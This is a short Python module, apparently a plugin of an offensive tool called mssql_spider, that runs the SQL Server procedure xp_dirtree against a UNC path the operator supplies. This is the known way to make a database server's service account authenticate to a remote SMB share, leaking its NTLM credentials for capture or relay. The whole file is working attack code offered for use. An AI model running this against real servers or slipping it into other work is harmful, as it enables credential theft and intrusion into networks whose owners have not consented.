from argparse import Namespace
from typing import Any

from mssql_spider.client import MSSQLClient


def visitor(opts: Namespace, client: MSSQLClient) -> dict[str, Any]:
    xp_dirtree(client, opts.dirtree)
    return {}


def xp_dirtree(client: MSSQLClient, uncpath: str) -> None:
    assert "'" not in uncpath
    client.query(f"EXEC master.sys.xp_dirtree '{uncpath}',1,1")
